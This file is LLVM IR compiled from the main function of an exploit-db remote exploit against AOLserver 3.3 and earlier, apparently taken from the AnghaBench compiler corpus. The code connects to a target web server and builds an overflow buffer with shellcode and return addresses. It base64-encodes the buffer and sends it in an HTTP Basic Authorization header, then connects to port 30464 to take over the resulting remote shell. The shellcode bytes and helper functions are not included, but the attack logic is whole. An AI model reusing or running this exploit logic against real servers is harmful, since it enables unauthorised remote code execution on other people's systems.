; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_21089.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_21089.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [56 x i8] c"\0A  AOLserver version 3.3 and prior exploit by qitest1\0A\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [20 x i8] c"Usage: %s <target>\0A\00", align 1
@.str.2 = private unnamed_addr constant [22 x i8] c"+Connecting to %s...\0A\00", align 1
@.str.3 = private unnamed_addr constant [13 x i8] c"  connected\0A\00", align 1
@.str.4 = private unnamed_addr constant [44 x i8] c"+Building buffer with shellcode len: %d...\0A\00", align 1
@shellcode = common dso_local global i8* null, align 8
@FP = common dso_local global i32 0, align 4
@SC_ADDR = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [8 x i8] c"  done\0A\00", align 1
@.str.6 = private unnamed_addr constant [21 x i8] c"+Encoding buffer...\0A\00", align 1
@.str.7 = private unnamed_addr constant [25 x i8] c"+Making http request...\0A\00", align 1
@.str.8 = private unnamed_addr constant [43 x i8] c"GET / HTTP/1.0\0AAuthorization: Basic %s\0D\0A\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [53 x i8] c"+Waiting for the shellcode to be executed...\0A  0x69\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca [1024 x i8], align 16
  %7 = alloca [1024 x i8], align 16
  %8 = alloca [1024 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %9 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str, i64 0, i64 0))
  %10 = load i32, i32* %3, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %19

12:                                               ; preds = %2
  %13 = load i32, i32* @stderr, align 4
  %14 = load i8**, i8*** %4, align 8
  %15 = getelementptr inbounds i8*, i8** %14, i64 0
  %16 = load i8*, i8** %15, align 8
  %17 = call i32 @fprintf(i32 %13, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0), i8* %16)
  %18 = call i32 @exit(i32 1) #3
  unreachable

19:                                               ; preds = %2
  %20 = load i8**, i8*** %4, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0), i8* %22)
  %24 = load i8**, i8*** %4, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 1
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @sockami(i8* %26, i32 80)
  store i32 %27, i32* %5, align 4
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0))
  %29 = load i8*, i8** @shellcode, align 8
  %30 = call i32 @strlen(i8* %29)
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.4, i64 0, i64 0), i32 %30)
  %32 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %33 = call i32 @memset(i8* %32, i32 0, i32 1024)
  %34 = load i32, i32* @FP, align 4
  %35 = load i32, i32* @SC_ADDR, align 4
  %36 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %37 = call i32 @zbuffami(i32 %34, i32 %35, i8* %36)
  %38 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.6, i64 0, i64 0))
  %40 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %41 = call i32 @memset(i8* %40, i32 0, i32 1024)
  %42 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %43 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %44 = call i32 @strlen(i8* %43)
  %45 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %46 = call i32 @Ns_HtuuEncode(i8* %42, i32 %44, i8* %45)
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  %48 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.7, i64 0, i64 0))
  %49 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %50 = getelementptr inbounds [1024 x i8], [1024 x i8]* %7, i64 0, i64 0
  %51 = call i32 @sprintf(i8* %49, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.8, i64 0, i64 0), i8* %50)
  %52 = load i32, i32* %5, align 4
  %53 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %54 = getelementptr inbounds [1024 x i8], [1024 x i8]* %8, i64 0, i64 0
  %55 = call i32 @strlen(i8* %54)
  %56 = call i32 @send(i32 %52, i8* %53, i32 %55, i32 0)
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0))
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.9, i64 0, i64 0))
  %59 = call i32 @sleep(i32 2)
  %60 = load i8**, i8*** %4, align 8
  %61 = getelementptr inbounds i8*, i8** %60, i64 1
  %62 = load i8*, i8** %61, align 8
  %63 = call i32 @sockami(i8* %62, i32 30464)
  store i32 %63, i32* %5, align 4
  %64 = load i32, i32* %5, align 4
  %65 = call i32 @shellami(i32 %64)
  ret i32 0
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @sockami(i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @zbuffami(i32, i32, i8*) #1

declare dso_local i32 @Ns_HtuuEncode(i8*, i32, i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @shellami(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
